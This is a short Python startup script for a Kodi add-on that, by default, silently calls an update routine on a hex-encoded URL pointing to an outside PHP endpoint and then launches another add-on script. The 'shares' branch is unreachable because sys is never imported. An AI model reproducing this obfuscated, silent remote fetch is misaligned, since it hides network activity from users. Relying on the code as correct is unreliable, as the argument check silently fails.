import xbmc, default, binascii

start_option  = 'normal'

try:
    if sys.argv[1] == 'shares':
        start_option = 'shares'
except:
    start_option  = 'normal'
    
if start_option == 'shares':
    xbmc.log('### Checking for any updated local shares')
    default.Check_My_Shares()

else:
    xbmc.log("### starting Grab Updates")
    default.Grab_Updates(binascii.unhexlify('687474703a2f2f746c62622e6d652f636f6d6d2e7068703f783d'),'silent')
    xbmc.executebuiltin('RunScript(special://home/addons/script.openwindow/functions.py)')